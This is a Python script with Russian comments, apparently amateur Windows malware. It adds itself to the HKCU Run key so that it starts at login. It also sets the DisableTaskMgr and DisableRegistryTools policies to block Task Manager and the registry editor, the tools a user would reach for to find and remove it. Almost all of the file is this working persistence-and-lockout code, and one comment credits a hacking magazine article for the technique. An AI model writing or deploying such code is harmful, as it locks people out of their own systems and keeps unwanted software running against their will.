import winreg as reg
import os
from winreg import *

pth = os.path.dirname(os.path.realpath(__file__))
p_name = "test_autorun.py"
address = os.path.join(pth, p_name)


def win32():
    # Функция для установки на Windows, которая закидывает файл в реестр автозагрузок.
    pth = os.path.dirname(os.path.realpath(__file__))  # Узнаем, где лежит файл, что указать до него путь
    p_name = "test_autorun.py"                         # Указываем название программе.
    address = os.path.join(pth, p_name)  # Склеиваем путь до прогрммы и название, чтобы получить полный путь.
    tmp = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_ALL_ACCESS)  # Кидаем в автозагрузки.
    reg.SetValue(tmp, None, reg.REG_SZ, address)
    reg.CloseKey(tmp)

def sub_key_system():
    # Создаем sub_key System, т.к. обычно ее нет.
    reg.CreateKey(reg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Policies\\System")

def dispetcher():
    # Функция блокировки (невозможности открытия) диспетчера задач.
    keyVal = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
    try:
        key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    except:
        key = CreateKey(HKEY_CURRENT_USER, keyVal)
    SetValueEx(key, "DisableTaskMgr", 0, REG_DWORD, 1)  # Как в статье на Хакере.
    CloseKey(key)

def registry():
    # Функция блокировки (невозможности открытия) встроенного редактора реестра.
    keyVal = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
    try:
        key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    except:
        key = CreateKey(HKEY_CURRENT_USER, keyVal)
    SetValueEx(key, "DisableRegistryTools", 0, REG_DWORD, 1)  # Как в статье на Хакере.
    CloseKey(key)

# Функция проверки наличия sub_key System (по умолчанию его обычно нет).
def system():
    key_to_read = r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
    try:
        reg = ConnectRegistry(None, HKEY_CURRENT_USER)
        k = OpenKey(reg, key_to_read)
        print("Есть")  # Действие если есть.
    except:
        sub_key_system()  # Действие если нет (например добавить).

# Функция проверки наличия ключа блокировки (невозможности открытия) диспетчера задач.
def proverka_registry():
    value = []  # Массив, куда будут записываться все ключи sub_key System.
    j = 0
    startup = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
    while 1:
        try:
            value.append(reg.EnumValue(startup, j))  # Запись всех ключей sub_key System в массив.
            j += 1
        except:
            break
    print(value)
    if (('DisableTaskMgr', 1, 4)) in value:  # Проверка массива на ключ.
        print("OK")  # Действие, если ключ есть.
    else:
        registry()  # Действие, если ключа нет (например добавление оного).

# Функция проверки наличия ключа блокировки (невозможности открытия) встроенного редактора реестра.
def proverka_dispetcher():
    value = []  # Массив, куда будут записываться все ключи sub_key System.
    j = 0
    startup = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
    while 1:
        try:
            value.append(reg.EnumValue(startup, j))  # Запись всех ключей sub_key System в массив.
            j += 1
        except:
            break
    print(value)
    if (('DisableRegistryTools', 1, 4)) in value:  # Проверка массива на ключ.
        print("OK")  # Действие, если ключ есть.
    else:
        dispetcher()  # Действие, если ключа нет (например добавление оного) .

def proverka_autorun():
    value = []  # Массив, куда будут записываться все ключи sub_key System.
    j = 0
    startup = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run")
    while 1:
        try:
            value.append(reg.EnumValue(startup, j))  # Запись всех ключей sub_key Run в массив.
            j += 1
        except:
            break
    print(value)
    if (('', address, 1)) in value:  # Проверка массива на ключ.
        print("OK")  # Действие, если ключ есть.
    else:
        win32()  # Действие, если ключа нет (например добавление оного).

def main():
    proverka_autorun()  # Проверяем наличие в атозагрузках и если нет, то добавляем.
    system()  # Проверяем наличие sub_key System и если нет, то создаем.
    proverka_dispetcher()  # Проверяем наличие блокировки диспетчера, если блокировки нет, то блокируем.
    proverka_registry()  # Проверяем налачие блокировки редактора регистра, если блокировки нет, то блокируем.
